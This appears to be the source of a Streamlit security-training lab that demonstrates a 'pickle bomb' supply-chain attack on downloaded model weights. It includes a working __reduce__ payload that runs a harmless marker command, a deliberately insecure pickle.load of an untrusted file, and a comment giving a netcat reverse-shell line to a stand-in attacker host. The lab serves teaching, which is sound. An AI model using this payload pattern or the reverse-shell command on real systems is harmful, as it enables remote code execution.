import streamlit as st
import time
import pickle
import os

# Define the malicious class used for the attack simulation
class MaliciousModelPayload:
    """
    This class acts as the 'Pickle Bomb'.
    When pickle.load() encounters this class, it executes the __reduce__ method.
    An attacker uses __reduce__ to define arbitrary code to run during deserialization.
    """
    def __reduce__(self):
        # The command that will run on the victim's machine.
        # In a real attack, this could be a reverse shell: 'nc -e /bin/sh attacker.com 4444'
        # Here, we simulate a visible but harmless RCE by creating a marker file in /tmp.
        cmd = 'touch /tmp/OWASP_LLM_RCE_TRIGGERED'
        # Return the callable (os.system) and its arguments (the command)
        return (os.system, (cmd,))

# --- SIMULATION SETUP ---
# We need to create the malicious "downloaded" file for the lab to work.
# In real life, the victim would download 'model.pkl' from a compromised Hugging Face repo.
if not os.path.exists("compromised_model.pkl"):
    # Create the malicious object
    bomb = MaliciousModelPayload()
    # Serialize (pickle) it into a file
    with open("compromised_model.pkl", "wb") as f:
        pickle.dump(bomb, f)
# ------------------------


st.header("Lab 19: Supply Chain Attack (The 'Pickle Bomb') (Vulnerable)")
st.error("💀 STATUS: VULNERABLE (Insecure Deserialization)")

st.markdown("""
**Scenario:** Your AI team needs to download a pre-trained LLM or fine-tuned weights to run locally. They find a model on a public repository that provides the weights in Python's `pickle` format (`.pkl`).
**The Attack:** An attacker has compromised the public repository account and replaced the legitimate `model.pkl` file with a malicious one. This malicious file contains a "pickle bomb"—hidden code that executes automatically the moment Python loads the file.
""")

st.subheader("Model Loader Interface")
st.write("Click below to download the latest model weights from the public hub.")

if st.button("Download & Load Model Weights (v2.1.pkl)"):
    st.info("Downloading 'compromised_model.pkl' from public hub...")
    time.sleep(1) # Simulate download time
    st.write("Download complete. Loading weights into memory...")
    time.sleep(0.5)

    try:
        # =========================================
        # VULNERABILITY: INSECURE DESERIALIZATION
        # =========================================
        # The code blindly trusts the downloaded `.pkl` file and loads it.
        # pickle.load() will execute whatever code is defined in the
        # object's __reduce__ method inside the file.

        with open("compromised_model.pkl", "rb") as f:
            # THE TRIGGER LINE
            loaded_model = pickle.load(f)

        # --- VERIFYING THE ATTACK (SIMULATION) ---
        # Check if the malicious payload successfully ran the OS command.
        if os.path.exists("/tmp/OWASP_LLM_RCE_TRIGGERED"):
             st.error("🚨 **CRITICAL SECURITY ALERT: Remote Code Execution (RCE) Detected!**")
             st.markdown("""
             The `pickle.load()` command executed arbitrary system commands hidden inside the model file.
             An attacker now has control over this server.
             """)
             # Cleanup the simulation marker
             os.remove("/tmp/OWASP_LLM_RCE_TRIGGERED")
        else:
             # This path should not be reachable if the exploit works
             st.success("Model loaded successfully.")

    except Exception as e:
        st.error(f"An error occurred: {e}")

st.divider()
st.markdown("""
**Attack Mechanism:** Python's `pickle` module is **not secure**. It is designed to serialize arbitrary Python objects, including code execution instructions. Never unpickle data received from an untrusted or public source.
""")
